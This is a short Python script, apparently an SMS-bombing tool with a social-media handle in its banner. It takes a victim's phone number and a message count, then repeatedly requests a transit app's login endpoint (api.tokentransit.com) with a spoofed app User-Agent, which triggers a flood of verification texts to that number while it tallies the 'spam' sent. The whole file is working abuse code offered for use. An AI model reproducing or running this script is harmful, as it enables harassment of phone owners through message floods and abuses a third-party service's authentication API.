from tqdm import tqdm
import requests
print("""
    
  _____           _                                                _         _     _ _       _ _   _           
 |_   _|         | |                                   _     ____ | |       | |   (_| |     | | | (_)          
   | |  _ __  ___| |_ __ _  __ _ _ __ __ _ _ __ ___   (_)   / __ \| |_ ___  | |__  _| | __ _| | |_ _ _ __ ___  
   | | | '_ \/ __| __/ _` |/ _` | '__/ _` | '_ ` _ \       / / _` | __/ __| | '_ \| | |/ _` | | __| | '_ ` _ \ 
  _| |_| | | \__ | || (_| | (_| | | | (_| | | | | | |  _  | | (_| | || (__  | | | | | | (_| | | |_| | | | | | |
 |_____|_| |_|___/\__\__,_|\__, |_|  \__,_|_| |_| |_| (_)  \ \__,_|\__\___| |_| |_|_|_|\__,_|_|\__|_|_| |_| |_|
                            __/ |                           \____/      ______                                 
                           |___/                                       |______|                                

""")
headers = ({'User-Agent':
        'Token Transit/4.2.4 (Android 9; sdk 28; gzip) okhttp'})
phoneNumber = input("Enter phone number: ")
phoneNumber = str(phoneNumber)
url = "https://api.tokentransit.com/v1/user/login?env=live&phone_number=%2B1%20"+phoneNumber
numofmsgs = int(input("Enter number of messages to send: "))
successspamCount = 0
failspamCount = 0
for i in tqdm(range(numofmsgs)):
    resp = requests.get(url)
    if resp.status_code == 200:
        successspamCount = successspamCount + 1
    else:
        failspamCount = failspamCount + 1
print("Total successful messages sent: ",  successspamCount)
print("Total failed messages sent: ", failspamCount)
